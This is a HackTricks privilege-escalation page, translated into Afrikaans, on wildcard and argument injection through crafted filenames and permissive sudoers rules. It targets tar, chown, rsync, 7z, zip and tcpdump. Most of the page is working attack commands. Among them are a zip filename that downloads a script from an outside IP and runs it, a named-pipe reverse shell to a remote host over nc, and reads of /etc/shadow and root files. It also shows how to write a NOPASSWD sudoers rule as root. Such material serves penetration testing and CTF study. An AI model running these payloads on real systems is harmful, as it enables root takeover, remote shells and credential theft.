# Wildcards — Bykomende Trieke

{{#include ../../banners/hacktricks-training.md}}

> Wildcard (aka *glob*) **argument injection** gebeur wanneer 'n bevoorregte skrip 'n Unix-binary soos `tar`, `chown`, `rsync`, `zip`, `7z`, … met 'n ongeciteerde wildcard soos `*` aanroep.
> Aangesien die shell die wildcard **voor** die binary uitgevoer word uitbrei, kan 'n aanvaller wat lêers in die werkgids kan skep, lêernaamme skep wat met `-` begin sodat hulle as **opsies in plaas van data** geïnterpreteer word, wat effektief arbitrêre flags of selfs opdragte insmokkel.
> Hierdie bladsy versamel die mees nuttige primitives, onlangse navorsing en moderne detections vir 2023-2025.

## chown / chmod

You can **copy the owner/group or the permission bits of an arbitrary file** by abusing the `--reference` flag:
```bash
# attacker-controlled directory
touch "--reference=/root/secret``file"   # ← filename becomes an argument
```
Wanneer root later iets soos die volgende uitvoer:
```bash
chown -R alice:alice *.php
chmod -R 644 *.php
```
`--reference=/root/secret``file` word ingespuit, waardeur *alle* ooreenstemmende lêers die eienaarskap/toestemmings van `/root/secret``file` erf.

*PoC & tool*: [`wildpwn`](https://github.com/localh0t/wildpwn) (combined attack).
Sien ook die klassieke DefenseCode-paper vir besonderhede.

---

## tar

### GNU tar (Linux, *BSD, busybox-full)

Voer willekeurige kommando's uit deur die **checkpoint**-funksie te misbruik:
```bash
# attacker-controlled directory
echo 'echo pwned > /tmp/pwn' > shell.sh
chmod +x shell.sh
touch "--checkpoint=1"
touch "--checkpoint-action=exec=sh shell.sh"
```
Sodra root bv. `tar -czf /root/backup.tgz *` uitvoer, word `shell.sh` as root uitgevoer.

### bsdtar / macOS 14+

Die standaard `tar` op onlangse macOS (gebaseer op `libarchive`) implementeer *nie* `--checkpoint` nie, maar jy kan steeds code-execution bereik met die **--use-compress-program** vlag wat jou toelaat om 'n eksterne compressor te spesifiseer.
```bash
# macOS example
touch "--use-compress-program=/bin/sh"
```
Wanneer 'n script met verhoogde regte `tar -cf backup.tar *` uitvoer, sal `/bin/sh` gestart word.

---

## rsync

`rsync` laat jou toe om die remote shell of selfs die remote binary te oorskryf via command-line flags wat begin met `-e` of `--rsync-path`:
```bash
# attacker-controlled directory
touch "-e sh shell.sh"        # -e <cmd> => use <cmd> instead of ssh
```
As root later archives the directory with `rsync -az * backup:/srv/`, the injected flag spawns your shell on the remote side.

*PoC*: [`wildpwn`](https://github.com/localh0t/wildpwn) (`rsync` modus).

---

## 7-Zip / 7z / 7za

Selfs wanneer die geprivilegieerde skrip *verdedigend* die wildcard met `--` voorskryf (om option parsing te stop), ondersteun die 7-Zip-formaat **file list files** deur die lêernaam met `@` te prefix. Deur dit met 'n symlink te kombineer kan jy *exfiltrate arbitrary files*:
```bash
# directory writable by low-priv user
cd /path/controlled
ln -s /etc/shadow   root.txt      # file we want to read
touch @root.txt                  # tells 7z to use root.txt as file list
```
As root iets soos uitvoer:
```bash
7za a /backup/`date +%F`.7z -t7z -snl -- *
```
7-Zip sal probeer om `root.txt` (→ `/etc/shadow`) as 'n lêerlys te lees en sal afbreek, **die inhoud na stderr skryf**.

---

## zip

Twee baie praktiese primitiewe bestaan wanneer 'n toepassing deur die gebruiker beheer­de lêername aan `zip` deurgee (hetsy via 'n wildcard of deur name te enumereer sonder `--`).

- RCE via test hook: `-T` aktiveer “test archive” en `-TT <cmd>` vervang die tester met 'n ewekansige program (lange vorm: `--unzip-command <cmd>`). As jy lêername kan injekteer wat met `-` begin, verdeel die flags oor afsonderlike lêername sodat short-options parsing werk:
```bash
# Attacker-controlled filenames (e.g., in an upload directory)
# 1) A file literally named: -T
# 2) A file named: -TT wget 10.10.14.17 -O s.sh; bash s.sh; echo x
# 3) Any benign file to include (e.g., data.pcap)
# When the privileged code runs: zip out.zip <files...>
# zip will execute: wget 10.10.14.17 -O s.sh; bash s.sh; echo x
```
Aantekeninge
- Moet NIE 'n enkele lêernaam soos `'-T -TT <cmd>'` probeer nie — kort opsies word per karakter ontleed en dit sal misluk. Gebruik afsonderlike tokens soos getoon.
- As skuinsstrepe uit lêernaam deur die app verwyder word, haal vanaf 'n blote host/IP (verstekpad `/index.html`) en stoor plaaslik met `-O`, voer dan uit.
- Jy kan parsing debug met `-sc` (wys verwerkte argv) of `-h2` (meer hulp) om te verstaan hoe jou tokens verwerk word.

Voorbeeld (lokale gedrag met zip 3.0):
```bash
zip test.zip -T '-TT wget 10.10.14.17/shell.sh' test.pcap    # fails to parse
zip test.zip -T '-TT wget 10.10.14.17 -O s.sh; bash s.sh' test.pcap  # runs wget + bash
```
- Data exfil/leak: As die weblaag `zip` stdout/stderr uitspog (algemeen met naïewe wrappers), sal ingespuite flags soos `--help` of foute van slegte opsies in die HTTP-antwoord verskyn, wat command-line injection bevestig en help met payload-afstemming.

---

## Bykomende binaries vatbaar vir wildcard injection (2023-2025 quick list)

Die volgende opdragte is in moderne CTFs en werklike omgewings misbruik. Die payload word altyd geskep as *filename* binne 'n skryfbare gids wat later met 'n wildcard verwerk sal word:

| Binary | Flag to abuse | Effect |
| --- | --- | --- |
| `bsdtar` | `--newer-mtime=@<epoch>` → arbitrary `@file` | Lees lêerinhoud |
| `flock` | `-c <cmd>` | Voer opdrag uit |
| `git`   | `-c core.sshCommand=<cmd>` | Command execution via git over SSH |
| `scp`   | `-S <cmd>` | Spawn arbitrary program instead of ssh |

Hierdie primitiewe is minder algemeen as die *tar/rsync/zip* klassiekers maar die moeite werd om te kontroleer wanneer jy soek.

---

## tcpdump rotation hooks (-G/-W/-z): RCE deur argv-inspuiting in wrappers

Wanneer 'n beperkte shell of vendor wrapper 'n `tcpdump` command line bou deur user-controlled velde (bv. 'n "file name" parameter) aan mekaar te koppel sonder streng aanhaling/validasie, kan jy ekstra `tcpdump` flags insmokkel. Die kombinasie van `-G` (time-based rotation), `-W` (limit number of files), en `-z <cmd>` (post-rotate command) lewer arbitrêre opdraguitvoering as die gebruiker wat tcpdump uitvoer (dikwels root op appliances).

Prevoorwaardes:

- Jy kan `argv` beïnvloed wat aan `tcpdump` gegee word (bv. via 'n wrapper soos `/debug/tcpdump --filter=... --file-name=<HERE>`).
- Die wrapper saneer nie spasies of `-`-geprefikseerde tokens in die lêernaamveld nie.

Klassieke PoC (voer 'n reverse shell-script uit vanaf 'n skryfbare pad):
```sh
# Reverse shell payload saved on the device (e.g., USB, tmpfs)
cat > /mnt/disk1_1/rce.sh <<'EOF'
#!/bin/sh
rm -f /tmp/f; mknod /tmp/f p; cat /tmp/f|/bin/sh -i 2>&1|nc 192.0.2.10 4444 >/tmp/f
EOF
chmod +x /mnt/disk1_1/rce.sh

# Inject additional tcpdump flags via the unsafe "file name" field
/debug/tcpdump --filter="udp port 1234" \
--file-name="test -i any -W 1 -G 1 -z /mnt/disk1_1/rce.sh"

# On the attacker host
nc -6 -lvnp 4444 &
# Then send any packet that matches the BPF to force a rotation
printf x | nc -u -6 [victim_ipv6] 1234
```
Besonderhede:

- `-G 1 -W 1` dwing 'n onmiddellike rotasie af ná die eerste ooreenstemmende pakket.
- `-z <cmd>` voer die post-rotate-kommando een keer per rotasie uit. Baie builds voer `<cmd> <savefile>` uit. As `<cmd>` 'n script/interpreter is, maak seker dat die hantering van argumente ooreenstem met jou payload.

Variante sonder verwisselbare media:

- As jy enige ander primitief het om lêers te skryf (bv. 'n afsonderlike command wrapper wat output-omleiding toelaat), plaas jou script in 'n bekende pad en aktiveer `-z /bin/sh /path/script.sh` of `-z /path/script.sh` afhangend van platform-semantiek.
- Sommige vendor wrappers roteer na aanvaller-beheerde lokasies. As jy die geroteerde pad kan beïnvloed (symlink/directory traversal), kan jy `-z` rig om inhoud uit te voer wat jy ten volle beheer sonder eksterne media.

---

## sudoers: tcpdump with wildcards/additional args → arbitrary write/read and root

Baie algemene sudoers anti-pattern:
```text
(ALL : ALL) NOPASSWD: /usr/bin/tcpdump -c10 -w/var/cache/captures/*/<GUID-PATTERN> -F/var/cache/captures/filter.<GUID-PATTERN>
```
Probleme
- Die `*` glob en permissiewe patrone beperk slegs die eerste `-w` argument. `tcpdump` aanvaar meerdere `-w` opsies; die laaste wen.
- Die reël beperk nie ander opsies nie, dus `-Z`, `-r`, `-V`, ens. word toegelaat.

Primitiewe
- Oorskryf die bestemmingspad met 'n tweede `-w` (die eerste voldoen slegs aan sudoers):
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ \
-w /dev/shm/out.pcap \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- Path traversal binne die eerste `-w` om uit die beperkte boom te ontsnap:
```bash
sudo tcpdump -c10 \
-w/var/cache/captures/a/../../../../dev/shm/out \
-F/var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- Forceer uitset-eienaarskap met `-Z root` (skep oral lêers wat aan root behoort):
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \
-w /dev/shm/root-owned \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- Skryf van arbitraire inhoud deur 'n gemaakte PCAP via `-r` af te speel (bv. om 'n sudoers-reël by te voeg):

<details>
<summary>Skep 'n PCAP wat die presiese ASCII payload bevat en skryf dit as root</summary>
```bash
# On attacker box: craft a UDP packet stream that carries the target line
printf '\n\nfritz ALL=(ALL:ALL) NOPASSWD: ALL\n' > sudoers
sudo tcpdump -w sudoers.pcap -c10 -i lo -A udp port 9001 &
cat sudoers | nc -u 127.0.0.1 9001; kill %1

# On victim (sudoers rule allows tcpdump as above)
sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \
-r sudoers.pcap -w /etc/sudoers.d/1111-aaaa \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
</details>

- Arbitrêre lêerlees/secret leak met `-V <file>` (interpreteer 'n lys van savefiles). Foutdiagnostiek echo dikwels reëls en laat inhoud leak:
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ -V /root/root.txt \
-w /tmp/dummy \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
---

## Verwysings

- [GTFOBins - tcpdump](https://gtfobins.github.io/gtfobins/tcpdump/)
- [GTFOBins - zip](https://gtfobins.github.io/gtfobins/zip/)
- [0xdf - HTB Dump: Zip arg injection to RCE + tcpdump sudo misconfig privesc](https://0xdf.gitlab.io/2025/11/04/htb-dump.html)
- [FiberGateway GR241AG - Full Exploit Chain](https://r0ny.net/FiberGateway-GR241AG-Full-Exploit-Chain/)

{{#include ../../banners/hacktricks-training.md}}
